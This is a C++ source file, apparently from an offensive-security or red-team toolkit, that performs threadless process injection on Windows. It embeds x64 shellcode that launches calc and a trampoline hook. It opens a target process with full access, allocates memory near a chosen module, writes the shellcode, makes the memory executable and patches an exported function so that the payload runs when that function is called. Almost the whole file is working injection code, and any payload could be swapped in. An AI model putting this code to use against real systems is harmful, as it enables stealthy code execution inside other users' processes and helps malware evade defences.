#include "headers/payload.h"
#include "utils/headers/CRTdefs.h"
#include "intrin.h"
#include <winternl.h>
#include "utils/headers/Tools.h"

// x64 calc payload
unsigned char payload[106] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};




// Trampoline hook shellcode
unsigned char hook[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};



// Executes the payload by instantiating the class
Payload::Payload(DWORD process, API::API_ACCESS& api, const char* dll, char* function)
{
	Tools tools;

	ULONG_PTR uAddress = NULL;

	HMODULE hModule = GetModuleHandleA(dll);

	if (hModule == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
		ExitProcess(-1);
	}

	FARPROC pFunctionToHook = (FARPROC)API::GetProcessAddress(hModule, function);

	if (!pFunctionToHook)
	{
		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
		ExitProcess(-1);
	}


	PatchHook(pFunctionToHook);


	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process);

	if (hProcess == INVALID_HANDLE_VALUE)
		tools.ExitProgram("failed to get a handle to the process");

	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(payload) + sizeof(hook), api))
		tools.ExitProgram("failed to find a memory gap");


	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)hook, sizeof(hook), (ULONG_PTR)payload, sizeof(payload)))
		tools.ExitProgram("failed to write payload buffer");


	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
		tools.ExitProgram("failed to install hook");


	MessageBoxA(NULL, "installed payload", "yay", MB_ICONWARNING);


}

// Locates a memory gap next to the DLL that exports the hooked function
bool Payload::LocateMemoryGap(HANDLE hProcess, _Out_ ULONG_PTR* puAddress, uintptr_t pHookedFunction, size_t sPayloadSize, API::API_ACCESS& api) {

	NTSTATUS    status    = NULL;
	ULONG_PTR   uAddress  = NULL;
	size_t      sTempSize = sPayloadSize;

	if (!api.func.pNtAllocateVirtualMemory)
		return false;

	for (uAddress = (pHookedFunction & 0xFFFFFFFFFFF70000) - 0x70000000;
		uAddress < pHookedFunction + 0x70000000;
		uAddress += 0x10000) {

		// Attempt to allocate virtual memory
		status = api.func.pNtAllocateVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), 0x00, &sTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (NT_SUCCESS(status)) {
			*puAddress = uAddress;
			return true;
		}
	}

	return false;
}



// This function redirects execution to the shellcode put into the memory gap, which uses a relative call instruction which requires an offset
bool Payload::InstallHook(HANDLE hProcess, void *pExportedFunc, void* pMainPayloadAddress)
{
	NTSTATUS status		   = NULL;

	DWORD dwOldProtection  = NULL;
	UCHAR uTrampoline[0x5] = { 0xE8, 0x0, 0x0, 0x0, 0x0 }; // Call rva
	unsigned long uRVA     = static_cast<unsigned long>((reinterpret_cast<ULONG_PTR>(pMainPayloadAddress) - (reinterpret_cast<ULONG_PTR>(pExportedFunc) + sizeof(uTrampoline)))); // The RVA 
	
	size_t sTempSize	   = sizeof(uTrampoline); 
	size_t sBytesWritten   = NULL;

	void *pTempAddr		   = pExportedFunc;

	auto &resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();

	if (!api.func.pNtProtectVirtualMemory || !api.func.pNtWriteVirtualMemory || !api.func.pNtProtectVirtualMemory)
		return false;
	
	memcpy(&uTrampoline[1], &uRVA, sizeof(uRVA));

	// Get write access to the targeted function
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_READWRITE, &dwOldProtection)))
	{
		MessageBoxA(NULL, "failed to get write access to the targeted function", "error", MB_ICONWARNING);
		return false;
	}

	// Patch 5 bytes of the exported function with the trampoline
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, pExportedFunc, uTrampoline, sizeof(uTrampoline), &sBytesWritten))) || sBytesWritten != sizeof(uTrampoline))
	{
		MessageBoxA(NULL, "failed to patch function", "error", MB_ICONWARNING);

		return false;
	}

	// Restore values
	sTempSize = sizeof(uTrampoline);
	pTempAddr = pExportedFunc;

	// Mark pExportedFunc as rwx, shellcode will restore bytes that were replaced by the trampoline
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
	{
		MessageBoxA(NULL, "failed to make function rwx", "error", MB_ICONWARNING);
		return false;
	}


	return true;
}

/* Hook shellcode
https://defuse.ca/online-x86-assembler.htm
																	  ; Original Shellcode:
start:
	; Save the address of the hooked function to the stack
	0:  5b                      pop    rbx							; instead of 'pop rax'
	1:  48 83 eb 04             sub    rbx,0x4						; instead of 'sub rax,0x5'
	5:  48 83 eb 01             sub    rbx,0x1
	9:  53                      push   rbx							; instead of 'push rax'

	; Save the hooked function's parameters
	a:  51                      push   rcx
	b:  52                      push   rdx
	c:  41 51                   push   r9							; instead of 'push r8'
	e:  41 50                   push   r8							; instead of 'push r9'
	10: 41 53                   push   r11							; instead of 'push r10'
	12: 41 52                   push   r10							; instead of 'push r11'

	; "0xaaaaaaaaaaaaaaaa" will be patched at runtime
	; Restore the hooked function's original bytes
	14: 48 b9 aa aa aa aa aa    movabs rcx,0xaaaaaaaaaaaaaaaa			; Place holder of the original bytes of the hooked function - instead of '0x1122334455667788'    (AT BYTE NMBR: 22)
	1b: aa aa aa
	1e: 48 89 0b                mov    QWORD PTR [rbx],rcx			; instead of '[rax]'

	; Execute the main payload
	21: 48 83 ec 20             sub    rsp,0x20
	25: 48 83 ec 20             sub    rsp,0x20
	29: e8 11 00 00 00          call   3f <shellcode>
	2e: 48 83 c4 40             add    rsp,0x40

	; Restore the hooked function's parameters
	32: 41 5a                   pop    r10							; instead of 'pop r11'
	34: 41 5b                   pop    r11							; instead of 'pop r10'
	36: 41 58                   pop    r8							; instead of 'pop r9'
	38: 41 59                   pop    r9							; instead of 'pop r8'
	3a: 5a                      pop    rdx
	3b: 59                      pop    rcx

	; Pass the execution to the hooked function, that will execute normally
	3c: 5b                      pop    rbx							; instead of 'pop rax'
	3d: ff e3                   jmp    rbx							; instead of 'jmp rax'

*/


void Payload::PatchHook(void *pExportedFunc) {
	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
	unsigned long long uOriginalBytes = *(unsigned long long*)pExportedFunc;

	// The place holder (0xaaaaaaaaaaaaaaaa) is at the 22nd byte
	memcpy(&hook[22], &uOriginalBytes, sizeof(uOriginalBytes));
}

bool Payload::WritePayloadBuffer( HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, size_t sHookShellcodeSize, ULONG_PTR uPayloadBuffer, size_t sPayloadSize)
{

	size_t		sTempSize		= sPayloadSize;
	size_t		sBytesWritten   = 0x00;
	DWORD		dwOldProtection = 0x00;
	NTSTATUS	status			= NULL;

	auto& resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();

	// Write g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress), reinterpret_cast<void*>(uHookShellcode), sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) 
		return false;
	
	// Write main payload after g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress + sBytesWritten), reinterpret_cast<void*>(uPayloadBuffer), sPayloadSize, &sBytesWritten))) || sBytesWritten != sPayloadSize) 
		return false;
	
	if (!NT_SUCCESS((status = api.func.pNtProtectVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) 
		return false;
	

	return true;
}